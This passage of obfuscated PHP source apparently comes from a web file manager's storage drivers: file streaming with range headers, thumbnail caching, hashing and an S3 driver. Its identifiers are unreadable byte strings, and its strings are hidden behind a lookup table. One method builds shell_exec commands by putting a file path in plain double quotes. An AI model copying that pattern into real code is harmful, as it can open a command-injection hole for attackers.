implode($ÖÒÁ²…[8], array_slice($’’‚î®Ù, 1)) . $öß–Şïœ; } $‚…ÇÖ›ü[] = $òõ­ÛÂ£; } return array_sort_by($‚…ÇÖ›ü, $ÖÒÁ²…[84]); } public function upload($À”éØÃ½, $Ä—ù¾œ÷, $¶ØÒ¤õ = false, $å¶ÄßÈÄ = REPEAT_REPLACE) { } public function uploadFileByID($¿–íüÉ’, $ò¢ş¡¦¦, $è®é²³) { } public function uploadFileByPath($È­¯Áï“, $Ûœ¼¸ñ, $ıé¾ßæğ = array()) { } public function isUploadServer() { $é‹¬Ëœô =& $_SERVER[³½¬ÚË¯]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $é‹¬Ëœô[88]) { return !0; } return $GLOBALS[$é‹¬Ëœô[6]][$é‹¬Ëœô[89]][$é‹¬Ëœô[90]]; } public function isFileOutServer() { $â³ı©éŞ =& $_SERVER[³½¬ÚË¯]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $â³ı©éŞ[88]) { return !0; } return $GLOBALS[$â³ı©éŞ[6]][$â³ı©éŞ[89]][$â³ı©éŞ[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($²©ŠÂÜ¶) { $ŞÍ’Û”ö =& $_SERVER[³½¬ÚË¯]; if (!$this->isCdnHost()) { return $²©ŠÂÜ¶; } return str_replace(trim(get_url_root($²©ŠÂÜ¶), $ŞÍ’Û”ö[8]), trim($this->cdnHost, $ŞÍ’Û”ö[8]), $²©ŠÂÜ¶); } public function uploadLink($ì°éä¥, $éóËÅ˜š = 0) { $øü‚şû§ =& $_SERVER[³½¬ÚË¯]; if ($this->isUploadServer()) { return; } $½¸â„Ÿë = $this->getType(); if (!in_array($½¸â„Ÿë, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Ûâ‘Æñë = 1024 * 1024 * 10; $™£€ªğ† = $éóËÅ˜š <= $Ûâ‘Æñë ? $øü‚şû§[92] : $øü‚şû§[93]; $ŒÏî±“ = (!$éóËÅ˜š ? 1 : ceil($éóËÅ˜š / pow(1024, 3))) * 3600 * 4; $µÑó©× = $this->{$™£€ªğ†}($ì°éä¥, $ŒÏî±“); if ($µÑó©×) { $µÑó©×[$øü‚şû§[94]] = $ì°éä¥; $µÑó©×[$øü‚şû§[95]] = $½¸â„Ÿë; } return $µÑó©×; } public function uploadFormData($¶´Ú–—Ğ, $´£ÆÕ…å = 3600) { } public function multiUploadFormData($œğ••ÁØ, $‘éÅÚöì = 3600) { } public function download($»Äæ¿ê, $ìÁÖË·ë) { } public function ext($¿ØØõé) { $½³¼¯òå =& $_SERVER[³½¬ÚË¯]; if (strpos($¿ØØõé, $½³¼¯òå[8]) === -1) { $¦µù×şÂ = $¿ØØõé; } else { $¦µù×şÂ = $this->pathThis($¿ØØõé); } $Û‹õòÏ³ = $½³¼¯òå[12]; if (strstr($¦µù×şÂ, $½³¼¯òå[10])) { $Û‹õòÏ³ = substr($¦µù×şÂ, strrpos($¦µù×şÂ, $½³¼¯òå[10]) + 1); $Û‹õòÏ³ = strtolower($Û‹õòÏ³); } if (strlen($Û‹õòÏ³) > 3 && preg_match($½³¼¯òå[96], $Û‹õòÏ³, $Ô‰¥›¸)) { $Û‹õòÏ³ = $½³¼¯òå[12]; } return $Û‹õòÏ³; } public function pathThis($«›¨ŠÆß) { $¹ê—Ïãñ =& $_SERVER[³½¬ÚË¯]; $«›¨ŠÆß = str_replace($¹ê—Ïãñ[97], $¹ê—Ïãñ[8], rtrim($«›¨ŠÆß, $¹ê—Ïãñ[8])); $ËÚ±™ú„ = strrpos($«›¨ŠÆß, $¹ê—Ïãñ[8]); if ($ËÚ±™ú„ === !1) { return $«›¨ŠÆß; } return substr($«›¨ŠÆß, $ËÚ±™ú„ + 1); } public function pathFather($äİè÷¸–) { $´û¼şî =& $_SERVER[³½¬ÚË¯]; $äİè÷¸– = str_replace($´û¼şî[97], $´û¼şî[8], rtrim($äİè÷¸–, $´û¼şî[8])); $®™ˆâ´Í = strrpos($äİè÷¸–, $´û¼şî[8]); if ($®™ˆâ´Í === !1) { return $´û¼şî[12]; } return substr($äİè÷¸–, 0, $®™ˆâ´Í + 1); } public function hashSimple($ŞÒÜ›à) { $¡é“şË =& $_SERVER[³½¬ÚË¯]; if (!$ŞÒÜ›à) { return md5($¡é“şË[12]); } $Ò˜û˜Šú = $this->size($ŞÒÜ›à); $Æ—áøĞó = 200; $öØåÃ À = 50; if ($Ò˜û˜Šú <= $Æ—áøĞó * $öØåÃ À) { return $this->hashMd5($ŞÒÜ›à) . $Ò˜û˜Šú; } $À©×ƒ’– = intval($Ò˜û˜Šú / $öØåÃ À); $Ôñà€ëÆ = $¡é“şË[12]; for ($ÚÏ¯®úË = 0; $ÚÏ¯®úË < $öØåÃ À; $ÚÏ¯®úË++) { $Ôñà€ëÆ .= $this->fileSubstr($ŞÒÜ›à, $À©×ƒ’– * $ÚÏ¯®úË, $Æ—áøĞó); } $Ôñà€ëÆ .= $this->fileSubstr($ŞÒÜ›à, $Ò˜û˜Šú - $Æ—áøĞó, $Æ—áøĞó); return md5($Ôñà€ëÆ) . $Ò˜û˜Šú; } public static $md5Cache = array(); public function hashMd5($»äúôŠ ) { if (!$»äúôŠ ) { return md5($_SERVER[³½¬ÚË¯][12]); } $»äúôŠ  = $this->iconvSystem($»äúôŠ ); if (isset(self::$md5Cache[$»äúôŠ ])) { return self::$md5Cache[$»äúôŠ ]; } self::$md5Cache[$»äúôŠ ] = $this->hashMd5Shell($»äúôŠ ); if (!self::$md5Cache[$»äúôŠ ]) { self::$md5Cache[$»äúôŠ ] = @md5_file($»äúôŠ ); } return self::$md5Cache[$»äúôŠ ]; } private function hashMd5Shell($¥óÅ‘ì´) { $„²™î =& $_SERVER[³½¬ÚË¯]; if (!$¥óÅ‘ì´) { return md5($„²™î[12]); } if (!function_exists($„²™î[98])) { return !1; } $òóêĞ‘Ì = array($„²™î[99], $„²™î[100]); $¶„İ¨Ê° = Cache::get($„²™î[101]); if (!$¶„İ¨Ê°) { $ê®İè = BASIC_PATH . $„²™î[102]; $ÎË˜ëİ¶ = md5_file($ê®İè); $¶„İ¨Ê° = $„²™î[103]; foreach ($òóêĞ‘Ì as $Ÿá¿øøê) { $“Úä’ÏÎ = shell_exec($Ÿá¿øøê . "\x20\x22{$ê®İè}\x22"); if ($“Úä’ÏÎ && substr(trim($“Úä’ÏÎ), 0, 32) == $ÎË˜ëİ¶) { $¶„İ¨Ê° = $Ÿá¿øøê; break; } } Cache::set($„²™î[101], $¶„İ¨Ê°, 3600); } if ($¶„İ¨Ê° == $„²™î[103]) { return !1; } $“Úä’ÏÎ = shell_exec($¶„İ¨Ê° . "\40\x22{$¥óÅ‘ì´}\42"); $“Úä’ÏÎ = str_replace($„²™î[104], $„²™î[12], $“Úä’ÏÎ); return substr($“Úä’ÏÎ, 0, 32); } public function link($¤‘„à¡€) { return $¤‘„à¡€; } public function fileOut($»™˜Ñàâ, $÷ğáÎÊí = false, $÷˜÷âı‘ = false, $şÎïô¾Å = '') { $ìíËØû› =& $_SERVER[³½¬ÚË¯]; $this->cacheMethod(null, null); if (!$»™˜Ñàâ || !$this->exist($»™˜Ñàâ)) { show_json(LNG($ìíËØû›[105]), !1, $÷˜÷âı‘); } $İØó¹Î¼ = $this->getType() == $ìíËØû›[106]; $âŠüÎï¿ = $GLOBALS[$ìíËØû›[6]][$ìíËØû›[89]][$ìíËØû›[107]][$ìíËØû›[108]]; $ôÍ€üòâ = (double) $GLOBALS[$ìíËØû›[6]][$ìíËØû›[89]][$ìíËØû›[107]][$ìíËØû›[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $™ìæ¼‚ = $this->infoFull($»™˜Ñàâ); $èíºÓ = $™ìæ¼‚[$ìíËØû›[76]]; $µ÷õåÂë = gmdate($ìíËØû›[110], $™ìæ¼‚[$ìíËØû›[85]]); $©›úàã = $÷˜÷âı‘ ? $÷˜÷âı‘ : $this->iconvApp($™ìæ¼‚[$ìíËØû›[32]]); $óÑıÑÇ = 0; $ÀŒá»İŞ = $èíºÓ - 1; $‡¯òêë = $this->ext($©›úàã); if (in_array($‡¯òêë, array($ìíËØû›[111], $ìíËØû›[112], $ìíËØû›[113], $ìíËØû›[114]))) { $‡¯òêë = $ìíËØû›[115]; } if (in_array($‡¯òêë, array($ìíËØû›[116]))) { $‡¯òêë = $ìíËØû›[117]; } if (!$şÎïô¾Å) { $şÎïô¾Å = md5($µ÷õåÂë . $èíºÓ); } $şÎïô¾Å = $ìíËØû›[118] . $şÎïô¾Å . $ìíËØû›[118]; $µı¡¯ = get_file_mime($‡¯òêë); $ËÕ€­•ß = !0; $ËÕ€­•ß = isset($_GET[$ìíËØû›[119]]) ? !1 : !0; if ($÷ğáÎÊí === !1 && !mime_support($µı¡¯)) { $µı¡¯ = $ìíËØû›[120]; } header($ìíËØû›[121]); header($ìíËØû›[122] . $µı¡¯); $†Ñş‡úœ = rawurlencode($©›úàã); $†Ñş‡úœ = $ìíËØû›[118] . $†Ñş‡úœ . $ìíËØû›[123] . $†Ñş‡úœ; if ($÷ğáÎÊí) { header($ìíËØû›[124]); header($ìíËØû›[125] . $†Ñş‡úœ); } else { if ($ËÕ€­•ß) { header($ìíËØû›[126] . $†Ñş‡úœ); } } header($ìíËØû›[127] . gmdate($ìíËØû›[110], time() + 3600 * 24 * 30) . $ìíËØû›[128]); header($ìíËØû›[129]); header($ìíËØû›[130]); header($ìíËØû›[131]); if (isset($_SERVER[$ìíËØû›[132]]) && strtotime($_SERVER[$ìíËØû›[132]]) == $™ìæ¼‚[$ìíËØû›[85]]) { header($ìíËØû›[133], !0, 304); die; } if (isset($_SERVER[$ìíËØû›[134]]) && $_SERVER[$ìíËØû›[134]] == $şÎïô¾Å) { header($ìíËØû›[135] . $şÎïô¾Å, !0, 304); die; } header($ìíËØû›[135] . $şÎïô¾Å); header($ìíËØû›[136] . $µ÷õåÂë . $ìíËØû›[128]); header($ìíËØû›[137] . $©›úàã); header($ìíËØû›[138]); header($ìíËØû›[139] . $èíºÓ); header($ìíËØû›[140]); Hook::trigger($ìíËØû›[141], $»™˜Ñàâ, $èíºÓ, $©›úàã, $‡¯òêë); if (!$÷ğáÎÊí && $‡¯òêë == $ìíËØû›[142]) { if ($èíºÓ > 1024 * 1024 * 5) { die; } $ø¹Ö€„ = $this->getContent($»™˜Ñàâ); $ø¹Ö€„ = Html::clearSVG($ø¹Ö€„); header($ìíËØû›[143] . strlen($ø¹Ö€„)); echo $ø¹Ö€„; die; } $— ¼›µâ = strtolower($_SERVER[$ìíËØû›[144]]); if ($İØó¹Î¼ && $— ¼›µâ && $âŠüÎï¿) { if (strstr($— ¼›µâ, $ìíËØû›[145])) { header($ìíËØû›[146] . $»™˜Ñàâ); } else { if (strstr($— ¼›µâ, $ìíËØû›[147])) { header($ìíËØû›[148] . $»™˜Ñàâ); } else { if (strstr($— ¼›µâ, $ìíËØû›[149])) { header($ìíËØû›[150] . $»™˜Ñàâ); } } } if ($ôÍ€üòâ) { header($ìíËØû›[151] . $ôÍ€üòâ); } return; } if (isset($_SERVER[$ìíËØû›[152]])) { if (preg_match($ìíËØû›[153], $_SERVER[$ìíËØû›[152]], $à¦…Íª‘)) { $óÑıÑÇ = intval($à¦…Íª‘[1]); $óÑıÑÇ = $óÑıÑÇ <= 0 ? 0 : ($óÑıÑÇ >= $ÀŒá»İŞ ? $ÀŒá»İŞ : $óÑıÑÇ); if (!empty($à¦…Íª‘[2])) { $ƒ¹¸ŠÔÎ = intval($à¦…Íª‘[2]); $ÀŒá»İŞ = $ƒ¹¸ŠÔÎ < $óÑıÑÇ ? $óÑıÑÇ : ($ƒ¹¸ŠÔÎ >= $ÀŒá»İŞ ? $ÀŒá»İŞ : $ƒ¹¸ŠÔÎ); } } header($ìíËØû›[154]); header("\103\x6f\156\164\x65\x6e\x74\x2d\122\x61\x6e\x67\x65\x3a\x20\x62\171\164\145\163\x20{$óÑıÑÇ}\55{$ÀŒá»İŞ}\57" . $èíºÓ); } else { header($ìíËØû›[155]); } header($ìíËØû›[156]); $ş¥ğ”Ÿ• = !0; if ($_SERVER[$ìíËØû›[157]] == $ìíËØû›[158] && $èíºÓ > 1204 * 1024 * 1024 * 2) { $ş¥ğ”Ÿ• = !1; } if ($ş¥ğ”Ÿ•) { header($ìíËØû›[159] . ($ÀŒá»İŞ - $óÑıÑÇ + 1)); } if ($_SERVER[$ìíËØû›[160]] == $ìíËØû›[161]) { return; } $–ûˆê®¶ = 1024 * 100; $õÁ»Ö÷ = 0; if ($ôÍ€üòâ) { $õÁ»Ö÷ = intval(1000 * 1000 * ($–ûˆê®¶ / $ôÍ€üòâ)); } while ($óÑıÑÇ <= $ÀŒá»İŞ) { $ùøƒœ£ = timeFloat(); check_abort(); $´™Öä´Ğ = $ÀŒá»İŞ - $óÑıÑÇ + 1; if ($´™Öä´Ğ <= $–ûˆê®¶) { $–ûˆê®¶ = $´™Öä´Ğ; } echo $this->fileSubstr($»™˜Ñàâ, $óÑıÑÇ, $–ûˆê®¶); $óÑıÑÇ += $–ûˆê®¶; if ($–ûˆê®¶ == $´™Öä´Ğ) { $óÑıÑÇ = $ÀŒá»İŞ + 1; } if ($õÁ»Ö÷) { $ÃŸû³å = intval(1000 * 1000 * (timeFloat() - $ùøƒœ£)); $Š®³Şäá = $õÁ»Ö÷ - $ÃŸû³å; if ($Š®³Şäá > 5) { usleep($Š®³Şäá); } } } } public function fileOutServer($æ…Ğêá…, $õËÑñÈø = false, $İ±¶Ä¸Ç = false, $æ”·ˆÔó = '') { $this->fileOut($æ…Ğêá…, $õËÑñÈø, $İ±¶Ä¸Ç, $æ”·ˆÔó); } public function fileOutLink($ºáÖñÛ) { header($_SERVER[³½¬ÚË¯][162] . $ºáÖñÛ); die; } public function cacheMethod($õ­‰Í‘„, $ïÄ·ê®‡, $ë¼Üõ·¶ = null) { $àÒş‚áó =& $_SERVER[³½¬ÚË¯]; static $¥²Ñ¼¬¸ = array(); $ÕïªÍ¹ = $ïÄ·ê®‡ ? ltrim($this->getPathOuter($ïÄ·ê®‡), $àÒş‚áó[8]) : $àÒş‚áó[12]; $ÄÌ­«‹ş = $àÒş‚áó[163] . $õ­‰Í‘„ . $àÒş‚áó[164] . rtrim($ÕïªÍ¹, $àÒş‚áó[8]); if (is_null($õ­‰Í‘„)) { $¥²Ñ¼¬¸ = array(); return; } if (is_null($ïÄ·ê®‡)) { foreach ($¥²Ñ¼¬¸ as $ÄÌ­«‹ş => $¾›ªßü) { if (!strstr($ÄÌ­«‹ş, $àÒş‚áó[163] . $õ­‰Í‘„ . $àÒş‚áó[165])) { continue; } unset($¥²Ñ¼¬¸[$ÄÌ­«‹ş]); } return; } if (!is_null($ë¼Üõ·¶)) { $¥²Ñ¼¬¸[$ÄÌ­«‹ş] = $ë¼Üõ·¶; return; } $Óüã› = isset($¥²Ñ¼¬¸[$ÄÌ­«‹ş]) ? $¥²Ñ¼¬¸[$ÄÌ­«‹ş] : null; if (!is_null($Óüã›)) { return $Óüã›; } $Óüã› = $this->{$õ­‰Í‘„}($ïÄ·ê®‡); $¥²Ñ¼¬¸[$ÄÌ­«‹ş] = $Óüã›; return $Óüã›; } public function cacheMethodInfoSet($•Ôüåºƒ, $÷°³°ßæ, $¦·»ºË = false) { $ïÃ¹Ö€ç =& $_SERVER[³½¬ÚË¯]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ïÃ¹Ö€ç[166], $•Ôüåºƒ, $÷°³°ßæ); $this->cacheMethod($ïÃ¹Ö€ç[167], $•Ôüåºƒ, $÷°³°ßæ ? !1 : !0); if (is_array($¦·»ºË)) { $this->cacheMethod($ïÃ¹Ö€ç[168], $•Ôüåºƒ, $¦·»ºË); } } public function fileOutImage($ºæ°ØÀ, $äèˆ„„¤ = 250) { $Á×„„× =& $_SERVER[³½¬ÚË¯]; set_timeout(); if (substr($ºæ°ØÀ, 0, 4) == $Á×„„×[149]) { $this->fileOutLink($ºæ°ØÀ); } $àõŞØÖˆ = $this->info($ºæ°ØÀ); $„æ²…Î× = !1; $‘™üĞÊ = isset($GLOBALS[$Á×„„×[169]]) ? $GLOBALS[$Á×„„×[169]] : array(); if ($‘™üĞÊ && $‘™üĞÊ[$Á×„„×[170]] == $àõŞØÖˆ[$Á×„„×[84]]) { $àõŞØÖˆ = $‘™üĞÊ; $ï‚ŞÍ®Á = $àõŞØÖˆ[$Á×„„×[171]]; if ($ï‚ŞÍ®Á && isset($ï‚ŞÍ®Á[$Á×„„×[172]])) { if ($ï‚ŞÍ®Á[$Á×„„×[172]] <= $äèˆ„„¤ && $ï‚ŞÍ®Á[$Á×„„×[173]] <= $äèˆ„„¤) { $„æ²…Î× = !0; } } } if ($àõŞØÖˆ[$Á×„„×[76]] <= 1024 * 50 || $„æ²…Î× || !function_exists($Á×„„×[174]) || $àõŞØÖˆ[$Á×„„×[175]] == $Á×„„×[176]) { return $this->fileOut($ºæ°ØÀ, !1, $àõŞØÖˆ[$Á×„„×[32]]); } $ËÒâ„ÜÉ = kodIO::hashPath($àõŞØÖˆ); $»º•æìª = "\x63\157\x76\x65\162\137{$ËÒâ„ÜÉ}\137{$äèˆ„„¤}\x2e\x70\156\147"; $ª¦­ó— = IO_PATH_SYSTEM_TEMP . $Á×„„×[177]; $¸ÒÉÚ‚ = IO::infoFullSimple($ª¦­ó—); $İ¶ÍôÏ³ = $¸ÒÉÚ‚ && is_array($¸ÒÉÚ‚) ? $¸ÒÉÚ‚[$Á×„„×[84]] : $Á×„„×[12]; if (!$İ¶ÍôÏ³) { $İ¶ÍôÏ³ = IO::mkdir($ª¦­ó—); } if ($àõŞØÖˆ[$Á×„„×[178]] == $Á×„„×[179] && isset($àõŞØÖˆ[$Á×„„×[180]]) && $àõŞØÖˆ[$Á×„„×[180]] == kodIO::sourceID($İ¶ÍôÏ³)) { $ó¬†Áæû = $àõŞØÖˆ[$Á×„„×[181]]; if ($äèˆ„„¤ <= 500) { $¢ÔôÃŠµ = preg_replace($Á×„„×[182], $Á×„„×[183], $àõŞØÖˆ[$Á×„„×[32]]); $ó¬†Áæû = IO::fileNameExist($İ¶ÍôÏ³, $¢ÔôÃŠµ); } return IO::fileOut(KodIO::make($ó¬†Áæû), !1, $àõŞØÖˆ[$Á×„„×[32]]); } $Ñ¥ú·ƒ = IO::fileNameExist($İ¶ÍôÏ³, $»º•æìª); if ($Ñ¥ú·ƒ) { return IO::fileOut(KodIO::make($Ñ¥ú·ƒ), !1, $àõŞØÖˆ[$Á×„„×[32]]); } if ($äèˆ„„¤ > 1000) { $this->makeImageCover($İ¶ÍôÏ³, $ºæ°ØÀ, $»º•æìª, $äèˆ„„¤); $this->makeImageCover($İ¶ÍôÏ³, $ºæ°ØÀ, "\x63\157\166\145\162\137{$ËÒâ„ÜÉ}\137\x32\65\x30\x2e\x70\x6e\147", 250); $Ñ¥ú·ƒ = IO::fileNameExist($İ¶ÍôÏ³, $»º•æìª); if ($Ñ¥ú·ƒ) { return IO::fileOut(KodIO::make($Ñ¥ú·ƒ), !1, $àõŞØÖˆ[$Á×„„×[32]]); } die; } $Ê‡¾ÜèÊ = Cache::get($»º•æìª); if ($Ê‡¾ÜèÊ == $Á×„„×[184] || $Ê‡¾ÜèÊ == $Á×„„×[185]) { echo $Ê‡¾ÜèÊ; die; } Cache::set($»º•æìª, $Á×„„×[185], 60); $ıÚñÍüÙ = array($İ¶ÍôÏ³, $àõŞØÖˆ[$Á×„„×[84]], $»º•æìª, $äèˆ„„¤); $³Œ­”Ú = $Á×„„×[186] . $àõŞØÖˆ[$Á×„„×[76]] . $Á×„„×[187] . $»º•æìª . $Á×„„×[188] . $àõŞØÖˆ[$Á×„„×[32]] . $Á×„„×[189] . $àõŞØÖˆ[$Á×„„×[84]]; TaskQueue::add($Á×„„×[190], $ıÚñÍüÙ, $³Œ­”Ú, $»º•æìª); } public function makeImageCover($¬¢Âƒœæ, $Ó–øÁ , $õù…“İ¨, $ªü¦º±ü) { $ÛĞûÑ’™ =& $_SERVER[³½¬ÚË¯]; if (IO::fileNameExist($¬¢Âƒœæ, $õù…“İ¨)) { return $ÛĞûÑ’™[191]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $èŞí†“š = DATA_THUMB . $õù…“İ¨; del_file($èŞí†“š); $¿¡ú£Æò = TEMP_FILES . $õù…“İ¨; if (!@file_exists($¿¡ú£Æò)) { $¿¡ú£Æò = IO::download($Ó–øÁ , $¿¡ú£Æò); } if (!@file_exists($¿¡ú£Æò)) { return $ÛĞûÑ’™[192]; } ImageThumb::createThumb($¿¡ú£Æò, $èŞí†“š, $ªü¦º±ü, $ªü¦º±ü * 10); if (@file_exists($èŞí†“š)) { Cache::remove($õù…“İ¨); return IO::move($èŞí†“š, $¬¢Âƒœæ); } Cache::set($õù…“İ¨, $ÛĞûÑ’™[184], 600); del_file($èŞí†“š); return $ÛĞûÑ’™[193] . $¿¡ú£Æò . $ÛĞûÑ’™[71]; } public function fileOutImageServer($îíèÒ¤¾, $¼¹®ëíë = 250) { $this->fileOutImage($îíèÒ¤¾, $¼¹®ëíë); } public function fileNameAuto($Ÿ­ùÏ¿«, $Ö—ã˜İä, $ï…ñªó = REPEAT_RENAME, $†Ğßò¤ = false) { $Œ„¡ú¬˜ =& $_SERVER[³½¬ÚË¯]; $ÀÀéÙæ = $Ÿ­ùÏ¿« === $Œ„¡ú¬˜[12] ? $Ö—ã˜İä : rtrim($Ÿ­ùÏ¿«, $Œ„¡ú¬˜[8]) . $Œ„¡ú¬˜[8] . $Ö—ã˜İä; if ($ï…ñªó == REPEAT_REPLACE || !$this->exist($ÀÀéÙæ) || $†Ğßò¤ && $ï…ñªó != REPEAT_RENAME_FOLDER) { return $Ö—ã˜İä; } if ($ï…ñªó == REPEAT_SKIP) { return !1; } $îšµ©—„ = $Œ„¡ú¬˜[10] . get_path_ext($Ö—ã˜İä); $îšµ©—„ = $îšµ©—„ == $Œ„¡ú¬˜[10] || $†Ğßò¤ ? $Œ„¡ú¬˜[12] : $îšµ©—„; $‰Ú›¶ä = 1; $×¢ˆ¹øı = substr($Ö—ã˜İä, 0, strlen($Ö—ã˜İä) - strlen($îšµ©—„)); $ãã³Ì”‹ = $×¢ˆ¹øı . "\50{$‰Ú›¶ä}\x29{$îšµ©—„}"; while ($this->exist(rtrim($Ÿ­ùÏ¿«, $Œ„¡ú¬˜[8]) . $Œ„¡ú¬˜[8] . $ãã³Ì”‹)) { $ãã³Ì”‹ = $×¢ˆ¹øı . "\x28{$‰Ú›¶ä}\x29{$îšµ©—„}"; $‰Ú›¶ä++; } return $ãã³Ì”‹; } private function fileNameAutoList($Œ‚ë„÷û, $¹‡õ üÀ, $É¯¸”ÑÚ = false) { $ãæ°¥é¹ =& $_SERVER[³½¬ÚË¯]; $ìŒÂÌ­ = $this->listPath($Œ‚ë„÷û, !0); $ìŒÂÌ­ = array_merge($ìŒÂÌ­[$ãæ°¥é¹[82]], $ìŒÂÌ­[$ãæ°¥é¹[83]]); $®ŸÛ¬Òß = array_to_keyvalue($ìŒÂÌ­, $ãæ°¥é¹[12], $ãæ°¥é¹[32]); $ı¥˜‚–˜ = $ãæ°¥é¹[10] . get_path_ext($¹‡õ üÀ); $ı¥˜‚–˜ = $ı¥˜‚–˜ == $ãæ°¥é¹[10] || $É¯¸”ÑÚ ? $ãæ°¥é¹[12] : $ı¥˜‚–˜; $ï—°… = substr($¹‡õ üÀ, 0, strlen($¹‡õ üÀ) - strlen($ı¥˜‚–˜)); $ÚÌ•†Í“ = $ï—°… . "\50\x30\51{$ı¥˜‚–˜}"; for ($Œ’ ¨Òü = 1; $Œ’ ¨Òü <= count($®ŸÛ¬Òß) + 1; $Œ’ ¨Òü++) { $ÚÌ•†Í“ = $ï—°… . "\50{$Œ’ ¨Òü}\51{$ı¥˜‚–˜}"; if (!in_array_not_case($ÚÌ•†Í“, $®ŸÛ¬Òß)) { return $ÚÌ•†Í“; } } return $ÚÌ•†Í“; } public function listAllFiles($›§ƒÜÃ, $ÙŠÔÚ£è) { $„¤ÂØ»ˆ =& $_SERVER[³½¬ÚË¯]; if (empty($ÙŠÔÚ£è)) { return array(); } $­Çƒº„Š = array_keys($ÙŠÔÚ£è); $…Û­°ˆ¦ = array(); $›§ƒÜÃ = trim($›§ƒÜÃ, $„¤ÂØ»ˆ[8]); foreach ($ÙŠÔÚ£è as $Ôç²— => $ë•¥…×˜) { $•ó„Ä¡´ = ltrim(substr(trim($Ôç²—, $„¤ÂØ»ˆ[8]), strlen($›§ƒÜÃ)), $„¤ÂØ»ˆ[8]); if (substr($Ôç²—, -1) == $„¤ÂØ»ˆ[8]) { $•ó„Ä¡´ = rtrim($•ó„Ä¡´, $„¤ÂØ»ˆ[8]) . $„¤ÂØ»ˆ[8]; } $…Û­°ˆ¦ = array_merge($…Û­°ˆ¦, $this->slicePath($•ó„Ä¡´)); } $²ŞÊ–Û¨ = array(); foreach (array_unique($…Û­°ˆ¦) as $İïÇ†­·) { $Â­Ï†°‹ = array($„¤ÂØ»ˆ[84] => $this->getPathOuter($„¤ÂØ»ˆ[8] . $›§ƒÜÃ . $„¤ÂØ»ˆ[8] . $İïÇ†­·), $„¤ÂØ»ˆ[75] => 1, $„¤ÂØ»ˆ[76] => 0); if (substr($İïÇ†­·, -1) != $„¤ÂØ»ˆ[8]) { $Â­Ï†°‹[$„¤ÂØ»ˆ[75]] = 0; $ÑÉİÌƒ° = $this->getPath($›§ƒÜÃ . $„¤ÂØ»ˆ[8] . $İïÇ†­·); if (isset($ÙŠÔÚ£è[$ÑÉİÌƒ°])) { $ßìª»™È = $ÙŠÔÚ£è[$ÑÉİÌƒ°]; if (isset($ßìª»™È[$„¤ÂØ»ˆ[76]])) { $Â­Ï†°‹[$„¤ÂØ»ˆ[76]] = intval($ßìª»™È[$„¤ÂØ»ˆ[76]]); } if (isset($ßìª»™È[$„¤ÂØ»ˆ[194]])) { $Â­Ï†°‹[$„¤ÂØ»ˆ[85]] = intval($ßìª»™È[$„¤ÂØ»ˆ[194]]); } } } $²ŞÊ–Û¨[] = $Â­Ï†°‹; } return $²ŞÊ–Û¨; } public function slicePath($óÔ··Ú´) { $Êê¬ÍÂã =& $_SERVER[³½¬ÚË¯]; $§—ÑºÒ = explode($Êê¬ÍÂã[8], trim($óÔ··Ú´, $Êê¬ÍÂã[8])); $¬ì˜”‹º = 0; do { ++$¬ì˜”‹º; $‰…„Şæ¤[] = implode($Êê¬ÍÂã[8], array_slice($§—ÑºÒ, 0, $¬ì˜”‹º)) . $Êê¬ÍÂã[8]; } while ($¬ì˜”‹º < count($§—ÑºÒ)); $‰…„Şæ¤[count($§—ÑºÒ) - 1] = $óÔ··Ú´; return $‰…„Şæ¤; } public function getHost() { $¼ÈÀÓº =& $_SERVER[³½¬ÚË¯]; $–¯èÓ‘ä = parse_url(trim($this->domain, $¼ÈÀÓº[8])); $²ø€ĞôÁ = isset($–¯èÓ‘ä[$¼ÈÀÓº[195]]) ? $–¯èÓ‘ä[$¼ÈÀÓº[195]] : http_type(); $·¾Î = isset($–¯èÓ‘ä[$¼ÈÀÓº[196]]) ? $–¯èÓ‘ä[$¼ÈÀÓº[196]] : $–¯èÓ‘ä[$¼ÈÀÓº[84]]; if (isset($–¯èÓ‘ä[$¼ÈÀÓº[197]])) { $·¾Î .= $¼ÈÀÓº[4] . $–¯èÓ‘ä[$¼ÈÀÓº[197]]; } return $²ø€ĞôÁ . $¼ÈÀÓº[198] . $·¾Î; } public function pathEncode($ÒÖáù·») { $—¼É‰ÙÅ =& $_SERVER[³½¬ÚË¯]; return str_replace($—¼É‰ÙÅ[199], $—¼É‰ÙÅ[8], rawurlencode($ÒÖáù·»)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($Æâä¬ˆØ) { set_timeout(); require_once SDK_DIR . $_SERVER[³½¬ÚË¯][200]; parent::__construct(); $this->_init($Æâä¬ˆØ); } public function _init($œÀæ¢õ©) { $this->config = $œÀæ¢õ©; foreach ($œÀæ¢õ© as $º§³Óí´ => $Üõ‡‡ß‡) { if (isset($this->{$º§³Óí´})) { $this->{$º§³Óí´} = $Üõ‡‡ß‡; } } $this->endpoint = $œÀæ¢õ©[$_SERVER[³½¬ÚË¯][201]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($İ‘åŒ‡ = "\x76\64") { $this->signVer = $İ‘åŒ‡; $this->client->setSignatureVersion($İ‘åŒ‡); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $ç°ø£Å¦ =& $_SERVER[³½¬ÚË¯]; $…à¥ˆê = $this->getBucketCors(); if (!$…à¥ˆê || !is_array($…à¥ˆê)) { return !1; } if ($…à¥ˆê[$ç°ø£Å¦[202]] != $ç°ø£Å¦[203] || $…à¥ˆê[$ç°ø£Å¦[204]] != $ç°ø£Å¦[203]) { return !1; } $ƒÄï”‹¤ = array_map($ç°ø£Å¦[205], $…à¥ˆê[$ç°ø£Å¦[206]]); if (!is_array($ƒÄï”‹¤)) { $ƒÄï”‹¤ = array(); } $Ö¦ñ¼ = array($ç°ø£Å¦[207], $ç°ø£Å¦[208], 